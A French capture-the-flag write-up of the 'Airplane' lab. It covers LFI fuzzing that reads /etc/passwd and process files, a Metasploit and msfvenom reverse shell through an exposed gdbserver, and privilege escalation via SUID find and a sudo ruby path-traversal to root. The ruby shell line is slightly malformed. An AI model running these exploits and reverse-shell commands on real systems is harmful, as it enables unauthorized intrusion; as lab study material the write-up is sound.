# ROOM : Airplane
Petite room medium

# Infos
La fin du write up et rapide est potentiellement incomplète car j'ai fini le challenge, mais j'ai oublier de finir le writeup... 
# Enumeration
## NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-22 14:02 EDT
Nmap scan report for 10.10.208.76
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 (RSA)
|   256 ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 (ECDSA)
|_  256 a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 (ED25519)
6048/tcp open  x11?
8000/tcp open  http-alt Werkzeug/3.0.2 Python/3.8.10
|_http-title: Did not follow redirect to http://airplane.thm:8000/?page=index.html
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
[...]
```
Un SSH, un werkzeug sur le port 8000 est un port 6048 inconnu. On va check tout ca!
## GOBUSTER
```
gobuster dir -u http://airplane.thm:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://airplane.thm:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/airplane             (Status: 200) [Size: 655]
```
La page airplane une page Let's fly avec un texte flotant qui donne envie de vomir :D
La page index.html comporte une URL qui indique une LFI
```
http://airplane.thm:8000/?page=index.html
```
# Exploitation
On va brute-force la LFI avec un petit tool en python de mon crue.
```
python3 SSF.py -u "http://airplane.thm:8000/?page=" -w lfi-payloads-wordlist.txt --ignore "Page not found" -v
```
```
Super Shitty Fuzzer (SSF) V1.1 !!!!
****************************************
- URL : http://airplane.thm:8000/?page=
- Wordlist : lfi-payloads-wordlist.txt
****************************************
[!] Checking if the target is alive...
[+] Target up and running!

[!] Fuzzing for files in the system...
[-] No response with the payload: http://airplane.thm:8000/?page=/etc/passwd
[-] No response with the payload: http://airplane.thm:8000/?page=../etc/passwd
[-] No response with the payload: http://airplane.thm:8000/?page=../../etc/passwd
[-] No response with the payload: http://airplane.thm:8000/?page=../../../etc/passwd
[+] Response from: http://airplane.thm:8000/?page=../../../../etc/passwd
Response status code: 200
Response headers: {'Server': 'Werkzeug/3.0.2 Python/3.8.10', 'Date': 'Mon, 22 Jul 2024 18:17:08 GMT, Mon, 22 Jul 2024 18:17:08 GMT', 'Content-Disposition': 'inline; filename=passwd', 'Content-Type': 'application/octet-stream', 'Content-Length': '2973', 'Last-Modified': 'Wed, 17 Apr 2024 05:05:11 GMT', 'Cache-Control': 'no-cache', 'ETag': '"1713330311.3460095-2973-1831145240"', 'Connection': 'close'}
Response content: b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:114::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:115::/nonexistent:/usr/sbin/nologin\navahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin\nusbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nrtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ncups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nspeech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\navahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\nkernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin\nsaned:x:117:123::/var/lib/saned:/usr/sbin/nologin\nnm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\nhplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false\nwhoopsie:x:120:125::/nonexistent:/bin/false\ncolord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\nfwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\ngeoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin\npulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\ngnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false\ngdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false\nsssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin\ncarlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nhudson:x:1001:1001::/home/hudson:/bin/bash\nsshd:x:128:65534::/run/sshd:/usr/sbin/nologin\n'
```
On trouve bien une LFI, et 2 comptes, **hudson** et **carlos**. Continuons...
```
[+] Response from: http://airplane.thm:8000/?page=../../../../etc/group
Response status code: 200
Response headers: {'Server': 'Werkzeug/3.0.2 Python/3.8.10', 'Date': 'Mon, 22 Jul 2024 18:23:48 GMT, Mon, 22 Jul 2024 18:23:48 GMT', 'Content-Disposition': 'inline; filename=group', 'Content-Type': 'application/octet-stream', 'Content-Length': '1062', 'Last-Modified': 'Wed, 17 Apr 2024 19:09:21 GMT', 'Cache-Control': 'no-cache', 'ETag': '"1713380961.6022193-1062-1578438323"', 'Connection': 'close'}
Response content: b'root:x:0:\ndaemon:x:1:\nbin:x:2:\nsys:x:3:\nadm:x:4:syslog\ntty:x:5:syslog\ndisk:x:6:\nlp:x:7:\nmail:x:8:\nnews:x:9:\nuucp:x:10:\nman:x:12:\nproxy:x:13:\nkmem:x:15:\ndialout:x:20:\nfax:x:21:\nvoice:x:22:\ncdrom:x:24:\nfloppy:x:25:\ntape:x:26:\nsudo:x:27:carlos\naudio:x:29:pulse\ndip:x:30:\nwww-data:x:33:\nbackup:x:34:\noperator:x:37:\nlist:x:38:\nirc:x:39:\nsrc:x:40:\ngnats:x:41:\nshadow:x:42:\nutmp:x:43:\nvideo:x:44:\nsasl:x:45:\nplugdev:x:46:\nstaff:x:50:\ngames:x:60:\nusers:x:100:\nnogroup:x:65534:\nsystemd-journal:x:101:\nsystemd-network:x:102:\nsystemd-resolve:x:103:\nsystemd-timesync:x:104:\ncrontab:x:105:\nmessagebus:x:106:\ninput:x:107:\nkvm:x:108:\nrender:x:109:\nsyslog:x:110:\ntss:x:111:\nbluetooth:x:112:\nssl-cert:x:113:\nuuidd:x:114:\ntcpdump:x:115:\navahi-autoipd:x:116:\nrtkit:x:117:\nssh:x:118:\nnetdev:x:119:\nlpadmin:x:120:\navahi:x:121:\nscanner:x:122:saned\nsaned:x:123:\nnm-openvpn:x:124:\nwhoopsie:x:125:\ncolord:x:126:\nfwupd-refresh:x:127:\ngeoclue:x:128:\npulse:x:129:\npulse-access:x:130:\ngdm:x:131:\nsssd:x:132:\nlxd:x:133:\ncarlos:x:1000:\nsambashare:x:134:\nsystemd-coredump:x:999:\nhudson:x:1001:\n'
```
```
[+] Response from: http://airplane.thm:8000/?page=../../../../proc/self/environ
Response status code: 200
Response headers: {'Server': 'Werkzeug/3.0.2 Python/3.8.10', 'Date': 'Mon, 22 Jul 2024 18:25:45 GMT, Mon, 22 Jul 2024 18:25:45 GMT', 'Content-Disposition': 'inline; filename=environ', 'Content-Type': 'application/octet-stream', 'Content-Length': '437', 'Last-Modified': 'Mon, 22 Jul 2024 18:25:45 GMT', 'Cache-Control': 'no-cache', 'ETag': '"1721672745.416054-0-3779662296"', 'Connection': 'close'}
Response content: b'LANG=en_US.UTF-8\x00LC_ADDRESS=tr_TR.UTF-8\x00LC_IDENTIFICATION=tr_TR.UTF-8\x00LC_MEASUREMENT=tr_TR.UTF-8\x00LC_MONETARY=tr_TR.UTF-8\x00LC_NAME=tr_TR.UTF-8\x00LC_NUMERIC=tr_TR.UTF-8\x00LC_PAPER=tr_TR.UTF-8\x00LC_TELEPHONE=tr_TR.UTF-8\x00LC_TIME=tr_TR.UTF-8\x00PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\x00HOME=/home/hudson\x00LOGNAME=hudson\x00USER=hudson\x00SHELL=/bin/bash\x00INVOCATION_ID=3c94ffffd0894ec48af956e6dcbec5d9\x00JOURNAL_STREAM=9:19914\x00'
```
```
[+] Response from: http://airplane.thm:8000/?page=../../../../proc/self/cmdline
Response status code: 200
Response headers: {'Server': 'Werkzeug/3.0.2 Python/3.8.10', 'Date': 'Mon, 22 Jul 2024 18:27:55 GMT, Mon, 22 Jul 2024 18:27:55 GMT', 'Content-Disposition': 'inline; filename=cmdline', 'Content-Type': 'application/octet-stream', 'Content-Length': '24', 'Last-Modified': 'Mon, 22 Jul 2024 18:20:02 GMT', 'Cache-Control': 'no-cache', 'ETag': '"1721672402.7080424-0-3770749363"', 'Connection': 'close'}
Response content: b'/usr/bin/python3\x00app.py\x00'
```
Le script mâche pas mal le travail, on a pas mal d'informations, et ca peux toujours être utile !
On sait donc :

1) Il y a 2 users, **hudson** et **carlos**
2) Un groupe user 1001 pour **hudson**
3) L'utilisateur principal est **hudson**
4) Un script python **app.py** est executer sur le système.

## Le port 6048
Ce port m'intrigue.

Je vais essayer de voir les processus en cours avec la LFI, peut-être que je trouverais un process vulnérable. Pour cela, on va bruteforcer les PIDs et lire le fichier **cmdline**. L'outil **ffuf** fera très bien l'affaire ici.

On va créer un fichier contenant les potentiels ID :
```
seq 200000 >> ids
```
Ensuite, on va fuzzer !
```
ffuf -w ids -u "http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline" 
```
```
[...]
556                     [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 34ms]
708                     [Status: 200, Size: 48, Words: 2, Lines: 1, Duration: 35ms]
712                     [Status: 200, Size: 48, Words: 2, Lines: 1, Duration: 33ms]
711                     [Status: 200, Size: 48, Words: 2, Lines: 1, Duration: 34ms]
714                     [Status: 200, Size: 107, Words: 5, Lines: 1, Duration: 34ms]
728                     [Status: 200, Size: 107, Words: 5, Lines: 1, Duration: 32ms]
735                     [Status: 200, Size: 107, Words: 5, Lines: 1, Duration: 36ms]
[...]
```
Il y a beaucoup de process en cours... Je vais faire un script qui me télécharge les 10000 premiers, et je vais ensuite mettre tout les fichiers dans un seul fichier.

Je trouve un process qui me plait bien en recherchant **airplane** !
```
/usr/bin/gdbserver0.0.0.0:6048airplane
```
Il s'agit de **gdbserver** qui est visiblement en écoute sur le port 6048. **gdbserver** est un debugger à distance grosso modo. On peux faire écouter gdbserver sur n'importe quel port et, pour l'instant, nmap n'est pas capable de reconnaître ce service.

Il existe des exploits sur **Metasploit**
```
msf6 > search gdbserver

Matching Modules
================

   #  Name                               Disclosure Date  Rank   Check  Description
   -  ----                               ---------------  ----   -----  -----------
   0  exploit/multi/gdb/gdb_server_exec  2014-08-24       great  No     GDB Server Remote Payload Execution
```
On retrouve aussi un exploit avec **searchsploit**
```
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                     |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)                                                                                                 | linux/remote/50539.py
--------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Je ne connais pas la verison de gdbserver, on va donc test hein !

## Le script python
Voici comment on l'utilise:
```
Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```
Ok let's go 

Le shell:
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```
netcat:
```
listening on [any] 4444 ...
```
Le script:
```
python3 50539.py 10.10.80.229:6048 rev.bin
[+] Connected to target. Preparing exploit
[!] ERROR: Unexpected response. Try again later
```
Super.

## Metasploit
Apres quelques galères car c'étais pas la bonne architecture, puis pas le bon payload,...
```
msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.11.50.195:4444 
[*] 10.10.80.229:6048 - Performing handshake with gdbserver...
[*] 10.10.80.229:6048 - Stepping program to find PC...
[*] 10.10.80.229:6048 - Writing payload at 00007ffff7fd0103...
[-] 10.10.80.229:6048 - Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
[*] Exploit completed, but no session was created.
```
Bon bah... Voila...
Je test plusieurs payloads, j'en trouve un qui fonctionne !
```
payload/linux/x64/shell_reverse_tcp
```
Voici la configuration:
```
msf6 exploit(multi/gdb/gdb_server_exec) > show options

Module options (exploit/multi/gdb/gdb_server_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
   RHOSTS    10.10.80.229     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     6048             yes       The target port (TCP)


Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.10.80.229     no        The target address


Exploit target:

   Id  Name
   --  ----
   1   x86_64
```
Me voila enfin avec un shell :
```
msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.11.50.195:4444 
[*] 10.10.80.229:6048 - Performing handshake with gdbserver...
[*] 10.10.80.229:6048 - Stepping program to find PC...
[*] 10.10.80.229:6048 - Writing payload at 00007ffff7fd0df0...
[*] 10.10.80.229:6048 - Executing the payload...
[*] Command shell session 2 opened (10.11.50.195:4444 -> 10.10.80.229:42148) at 2024-07-22 17:23:25 -0400

id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
```
# Post-Exploitation
On arrive donc bien sur le serveur avec la session de **hudson**.

Je trouve ce script **app.py** dans **/home/hudson/app/app.py**, il s'agit du site en gros.

# Privesc
Avec linpeas, je retrouve ceci :
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                     
-rwsr-xr-x 1 carlos carlos 313K Feb 18  2020 /usr/bin/find  
```
Je prend le shell de **carlos** avec la commande suivante (trouver sur GTFOBins)
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```
Ce shell étant un peu... claqué ? Je créer une clé ssh et je me connecte sur le serveur avec SSH avec le compte de **carlos**

# Privesc to root
La privesc est relativement facile, dés la connexion en SSH, je regarde les droits sudo avec **sudo -l**

```
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```
Rien de plus simple. On va créer un script ruby qui spawn un shell
```
system(/bin/bash)
```
et on l'execute en modifiant le path:
```
sudo /usr/bin/ruby /root/../home/carlos/script.rb
```
Et me voila avec un shell root.
